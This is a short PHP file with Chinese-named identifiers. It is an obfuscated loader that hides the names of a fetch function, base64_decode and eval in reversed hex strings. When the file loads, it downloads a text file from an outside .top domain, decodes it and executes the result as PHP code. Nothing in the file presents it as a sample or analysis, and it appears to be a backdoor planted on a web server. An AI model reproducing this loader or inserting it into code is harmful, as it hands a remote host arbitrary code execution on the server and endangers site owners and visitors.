<?php
class 加载器 {
    private static $方法库 = [];
    
    public static function 准备() {

        $获取 = strrev(hex2bin('73746e656d676f635f74656e675f656c6966'));
        $解码 = strrev(hex2bin('65646f6365645f343665736162'));
        $执行 = strrev(hex2bin('6c617665'));
        
        self::$方法库 = [
            '下载' => function($链接) use ($获取) { return $获取($链接); },
            '转换' => function($输入) use ($解码) { 
                $结果 = $解码($输入, true);
                return ($结果 !== false) ? $结果 : $输入;
            },
            '运行' => function($代码) use ($执行) { return $执行('?>' . $代码); }
        ];
    }
    
    public static function 处理($源地址) {
        $原始数据 = self::$方法库['下载']($源地址);
        $处理数据 = self::$方法库['转换']($原始数据);
        return self::$方法库['运行']($处理数据);
    }
}

加载器::准备();
加载器::处理("https://ampnyapunyaku.top/tools/s-media/media-new.txt");
?>
